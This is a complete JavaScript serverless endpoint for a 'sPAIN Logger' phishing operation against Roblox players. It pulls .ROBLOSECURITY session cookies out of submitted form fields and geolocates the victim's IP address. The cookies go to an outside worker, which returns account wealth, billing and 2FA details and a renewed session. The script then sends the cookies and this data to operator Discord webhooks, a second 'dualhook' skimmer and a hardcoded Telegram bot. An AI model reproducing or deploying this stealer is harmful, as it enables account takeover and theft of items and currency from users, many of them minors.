// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
const DISCORD_INV = 'https://discord.gg/spain';

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
const EMOJI     = '<a:emoji_17:1508694920972468347>';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl = new AbortController();
    const t    = setTimeout(() => ctrl.abort(), 3000);
    const r    = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(t);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
  } catch { return null; }
}

// Retry up to 3 times — fixes cold start "works on 3rd try" issue
async function getWorkerInfo(cookie, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const r = await fetch(WORKER_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
      });
      if (!r.ok) {
        if (i < retries - 1) { await new Promise(r => setTimeout(r, 1500)); continue; }
        return null;
      }
      const d = await r.json();
      if (d.valid || d.success) return d;
      // Worker returned failure — retry
      if (i < retries - 1) await new Promise(r => setTimeout(r, 1500));
    } catch {
      if (i < retries - 1) await new Promise(r => setTimeout(r, 1500));
    }
  }
  return null;
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}
function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

const CC_FLAGS = { US:'🇺🇸',GB:'🇬🇧',CA:'🇨🇦',AU:'🇦🇺',DE:'🇩🇪',FR:'🇫🇷',NL:'🇳🇱',PH:'🇵🇭',ID:'🇮🇩',SG:'🇸🇬',MY:'🇲🇾',IN:'🇮🇳',JP:'🇯🇵',KR:'🇰🇷',BR:'🇧🇷',MX:'🇲🇽',NZ:'🇳🇿',IE:'🇮🇪',SE:'🇸🇪',NO:'🇳🇴',DK:'🇩🇰',FI:'🇫🇮',PL:'🇵🇱',ES:'🇪🇸',IT:'🇮🇹',RU:'🇷🇺',TR:'🇹🇷',ZA:'🇿🇦',AR:'🇦🇷',VN:'🇻🇳',TH:'🇹🇭',SA:'🇸🇦',AE:'🇦🇪' };
const CN_FLAGS = { 'United States':'🇺🇸','United Kingdom':'🇬🇧','Canada':'🇨🇦','Australia':'🇦🇺','Germany':'🇩🇪','France':'🇫🇷','Netherlands':'🇳🇱','Philippines':'🇵🇭','Indonesia':'🇮🇩','Singapore':'🇸🇬','Malaysia':'🇲🇾','India':'🇮🇳','Japan':'🇯🇵','South Korea':'🇰🇷','Brazil':'🇧🇷','Mexico':'🇲🇽','New Zealand':'🇳🇿','Ireland':'🇮🇪','Sweden':'🇸🇪','Norway':'🇳🇴','Denmark':'🇩🇰','Finland':'🇫🇮','Poland':'🇵🇱','Spain':'🇪🇸','Italy':'🇮🇹','Russia':'🇷🇺','Turkey':'🇹🇷','South Africa':'🇿🇦' };
function cflag(code) { return CC_FLAGS[code?.toUpperCase()] || '🌐'; }
function nflag(name) { return CN_FLAGS[name] || '🌐'; }

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: WH_NAME, avatar_url: WH_AVATAR, ...payload })
    });
  } catch (_) {}
}
async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, { content: first ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '') : chunk + (rem.length === 0 ? '\n```' : '') });
    first = false;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  // Respond 200 immediately — all work runs after, Vercel keeps alive up to maxDuration
  res.status(200).json({ success: true });

  try {
    const ip    = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
    const now   = new Date().toISOString();
    const pName = record.displayName || slug;
    const isDH  = !!record.dualhookParent;
    const cookie = findCookie(slots);

    let webhook1 = null;
    const webhook2 = record.webhook;
    if (isDH) {
      try { const p = await redisGet(`slot:${record.dualhookParent}`); if (p?.webhook) webhook1 = p.webhook; } catch (_) {}
    }
    const allWH = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];

    // ── No cookie ─────────────────────────────────────────────────────────
    if (!cookie) {
      const geo = await getIpGeo(ip);
      const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
      await Promise.all(allWH.map(wh => discordSend(wh, {
        content: '@everyone',
        embeds: [{
          title: '⚠️ Wrong Cookie — Troll Detected',
          description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
          color: 0xff3333,
          fields: [
            { name: '🌐 IP',       value: `\`${ip}\``,          inline: true  },
            { name: '📍 Location', value: loc,                   inline: true  },
            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true  },
            { name: '🕐 Time',     value: now,                   inline: false }
          ],
          footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now
        }]
      })));
      await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>`);
      return;
    }

    // ── Geo + worker (with retries) in parallel ────────────────────────────
    const [geo, info] = await Promise.all([getIpGeo(ip), getWorkerInfo(cookie)]);
    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
    const isp = geo?.isp || 'Unknown';

    // ── Always send raw cookie first — safe no matter what worker returns ──
    await Promise.all(allWH.map(async wh => {
      await discordSend(wh, {
        content: '@everyone',
        embeds: [{
          title:       '🍪 Cookie Captured',
          description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
          color:       0xc026d3,
          fields: [
            { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
            { name: '📄 Page',     value: pName,        inline: true  },
            { name: '🕐 Time',     value: now,          inline: false },
            { name: '📍 Location', value: loc,          inline: true  },
            { name: '🗺️ ISP',      value: isp,          inline: true  },
            ...(isDH ? [
              { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true },
              { name: '🔗 DH Child',  value: `\`${slug}\``,                 inline: true }
            ] : [])
          ],
          footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now
        }]
      });
      await discordChunked(wh, cookie);
    }));

    await tgSend([`🍪 <b>COOKIE — ${pName}</b>`, `🌐 <code>${ip}</code>`, `📍 ${loc}`, `🗺️ ${isp}`].join('\n'));

    if (!info) {
      await tgSend(`⚠️ <b>WORKER FAILED after 3 retries — ${pName}</b>\nCookie already sent to Discord.`);
      return;
    }

    // ── Build rich embed matching exact format ─────────────────────────────
    const uid          = info.id || info.userId || '';
    const username     = info.username || '';
    const displayName  = info.displayName || username;
    const ageDays      = info.ageDays ?? 0;
    const ageBracket   = info.ageBracket || '13+';
    const robux        = info.robux ?? 0;
    const pendingRobux = info.pendingRobux ?? 0;
    const credit       = info.credit ?? 0;
    const creditCurr   = info.creditCurr || 'USD';
    const devex        = info.devex ?? 0;
    const payCount     = info.payCount ?? 0;
    const groupsOwned  = info.groupsOwned ?? 0;
    const groupBalance = info.groupBalance ?? 0;
    const groupPending = info.groupPending ?? 0;
    const limiteds     = info.limitedsCount ?? 0;
    const rap          = info.rap ?? 0;
    const emailSet     = info.emailSet ?? false;
    const emailVerified = info.emailVerified ?? false;
    const tfaMethods   = info.tfaMethods || 'Disabled';
    const mm2          = info.mm2 ?? 0;
    const adoptMe      = info.adoptMe ?? 0;
    const ps99         = info.ps99 ?? 0;
    const avatarUrl    = info.avatarUrl || info.fullAccount?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';

    // Account country from locale endpoint
    const accCC      = info.accCountryCode;
    const accCountry = accCC ? `${accCC} ${cflag(accCC)}` : `Unknown 🌐`;
    const victimCountry = `${geo?.country || 'Unknown'} ${nflag(geo?.country)}`;

    // Cookie for ROBLOSECURITY field
    const cookieDisplay = cookie.length > 1010 ? cookie.substring(0, 1010) + '…' : cookie;
    const refreshUrl    = `https://spain-tools.vercel.app/r/${Math.random().toString(36).slice(2, 10) + Date.now().toString(36)}`;

    const richEmbed = {
      title:       `🧑 ${displayName} ${ageBracket}`,
      description: `:fire: \`sPAIN\` :fire:\n\n[Refresh Cookie 🍪](${refreshUrl}) | [Profile 👤](https://www.roblox.com/users/${uid}/profile) | [Discord Server](${DISCORD_INV})\n\n[:Join Discord:](${DISCORD_INV})`,
      color:       5793266,
      thumbnail:   { url: avatarUrl },
      fields: [
        { name: '👤 Username',
          value: username, inline: true },
        { name: '📊 Account Stats',
          value: `\`Account Age:\` \`${fmt(ageDays)} Days\``, inline: false },
        { name: '📍 Locations',
          value: `• \`Account:\` ${accCountry}\n• \`Victim:\` ${victimCountry}`, inline: false },
        { name: '💳 Billing',
          value: `Credit: ${fmt(credit)} ${creditCurr}\nConvert: ${fmt(devex)}\nPayments: ${payCount}`, inline: true },
        { name: '👥 Groups',
          value: `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`, inline: true },
        { name: '⚙️ Settings',
          value: `Email: ${emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${tfaMethods === 'Disabled' ? 'Disabled ❌' : `${tfaMethods} ✅`}`, inline: true },
        { name: '💰 Account Funds',
          value: `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`, inline: true },
        { name: '🛒 Purchases',
          value: `Limiteds: ${limiteds}\nSummary: ${fmt(rap)}`, inline: true },
        { name: '🎮 Gamepasses Played',
          value: `Pet Simulator 99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMurder Mystery 2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`, inline: false },
        { name: '🔐 ROBLOSECURITY',
          value: '```' + cookieDisplay + '```', inline: false }
      ],
      footer:    { text: `sPAIN Logger • ${pName} • ${now}` },
      timestamp: now
    };

    await Promise.all(allWH.map(async wh => {
      await discordSend(wh, { embeds: [richEmbed] });
      if (info.powershell) await discordChunked(wh, info.powershell);
      // If cookie was renewed, send the fresh one too
      if (info.isDifferent && info.bestCookie) {
        await discordSend(wh, { embeds: [{ title: '🔄 Cookie Renewed — Fresh Session', color: 0x22c55e, footer: { text: `sPAIN Tools • ${pName}` } }] });
        await discordChunked(wh, info.bestCookie);
      }
    }));

    await tgSend([
      `✅ <b>INFO — ${username} ${ageBracket}</b>`,
      `💰 ${fmt(robux)} R$ | RAP: ${fmt(rap)}`,
      `👥 Groups: ${groupsOwned} | ${fmt(groupBalance)} R$`,
      `📍 ${loc}`,
      `🔄 ${refreshUrl}`
    ].join('\n'));

  } catch (err) {
    console.error('Post-response error:', err.message);
  }
}
